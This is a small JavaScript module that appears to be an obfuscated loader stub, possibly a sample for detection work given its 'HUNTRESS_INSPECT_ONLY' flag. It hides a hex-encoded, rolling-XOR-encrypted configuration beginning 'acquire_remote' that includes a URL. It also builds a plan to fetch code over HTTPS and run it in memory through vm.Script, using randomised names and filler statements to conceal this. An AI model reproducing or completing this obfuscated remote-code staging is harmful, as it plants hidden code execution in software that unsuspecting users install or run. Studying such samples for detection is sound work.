  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_a744633c = "[\"5e\",\"63\",\"52\",\"2e\",\"5d\",\"29\",\"4c\",\"3c\",\"4f\",\"72\",\"13\",\"70\",\"01\",\"74\",\"1d\",\"6f\",\"0a\",\"55\",\"27\",\"42\",\"2f\",\"40\",\"34\",\"51\",\"7d\",\"19\",\"70\",\"03\",\"73\",\"12\",\"66\",\"05\",\"6d\",\"32\",\"5f\",\"3a\",\"57\",\"38\",\"4a\",\"33\",\"4f\",\"2e\",\"4a\",\"2b\",\"5b\",\"2f\",\"4a\",\"38\",\"05\",\"6d\",\"19\",\"6d\",\"1d\",\"6e\",\"31\",\"45\",\"2d\",\"48\",\"26\",\"79\",\"0f\",\"62\",\"1e\",\"6d\",\"19\",\"78\",\"1f\",\"7a\",\"25\",\"46\",\"29\",\"5c\",\"32\",\"46\",\"7b\",\"4a\",\"36\",\"55\",\"34\",\"59\",\"29\",\"48\",\"21\",\"46\",\"28\",\"77\",\"1e\",\"7a\",\"47\",\"09\",\"46\",\"02\",\"47\",\"6a\",\"53\",\"60\",\"57\",\"67\",\"23\",\"66\",\"52\",\"65\",\"19\",\"6c\",\"1e\",\"72\",\"4f\",\"27\",\"53\",\"27\",\"57\",\"24\",\"1e\",\"31\",\"1e\",\"70\",\"1f\",\"7b\",\"1e\",\"33\",\"0a\",\"39\",\"0e\",\"3e\",\"5a\",\"3f\",\"0b\",\"3c\",\"5e\",\"6b\",\"5c\",\"6c\",\"42\",\"27\",\"5f\",\"3e\",\"53\",\"23\",\"4f\",\"2a\",\"04\",\"6d\",\"03\",\"75\",\"14\",\"78\",\"11\",\"75\",\"5a\",\"3b\",\"4b\",\"22\",\"5e\",\"2b\",\"58\",\"3d\",\"4f\",\"10\",\"71\",\"16\",\"73\",\"1d\",\"69\",\"54\",\"1a\",\"75\",\"11\",\"74\",\"35\",\"40\",\"24\",\"4d\",\"39\",\"16\",\"2f\",\"1c\",\"2b\",\"1b\"]";
  const Codec_a744633c = "hex_array|rolling_xor|28";

  function load_a744633c() { return JSON.parse(Material_a744633c).map((value) => Number.parseInt(value, 16)); }
  function decode_a744633c(item1) { let item5 = 40; return item1.map((value) => { const decoded = value ^ item5; item5 = value; return decoded; }); }
  async function recover_a744633c() {
    const item3 = [3, 5, 8, 13].slice(1, 3);
    const item1 = load_a744633c(); let item2 = [];
    item2 = await (async () => decode_a744633c(item1))();
    void item3; return Buffer.from(item2).toString("ascii");
  }
  async function inspect_a744633c() { return ({ ...{ value: await recover_a744633c() } }).value; }
  async function plan_a744633c() { const inspect = inspect_a744633c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }
  void moduleShape; void plan_a744633c;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_a744633c());
